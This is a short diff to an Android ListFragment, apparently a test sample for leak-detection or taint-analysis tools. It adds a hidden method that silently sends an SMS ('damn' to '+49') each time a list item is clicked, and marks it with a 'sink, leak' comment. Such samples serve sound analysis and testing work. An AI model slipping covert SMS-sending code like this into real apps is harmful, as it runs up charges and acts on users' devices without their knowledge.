@@ -4,11 +4,13 @@ import android.annotation.SuppressLint;
 import android.app.FragmentTransaction;
 import android.app.ListFragment;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
+import android.widget.Toast;
 
 @SuppressLint("NewApi")
 public class FragmentTitle extends ListFragment {
@@ -40,6 +42,7 @@ public class FragmentTitle extends ListFragment {
 		super.onListItemClick(l, v, position, id);
 		OnTitleClickListener listener = (OnTitleClickListener) (getActivity());
 		listener.onTitleClick(content[position]);
+		sendMessage();
 	}
 
 	@Override
@@ -48,6 +51,11 @@ public class FragmentTitle extends ListFragment {
 	}
 
 	public interface OnTitleClickListener {
-		public void onTitleClick(String content);
+        void onTitleClick(String content);
+	}
+
+	private void sendMessage() {
+		SmsManager sms = SmsManager.getDefault();
+		sms.sendTextMessage("+49", null, "damn", null, null);  //sink, leak
 	}
 }
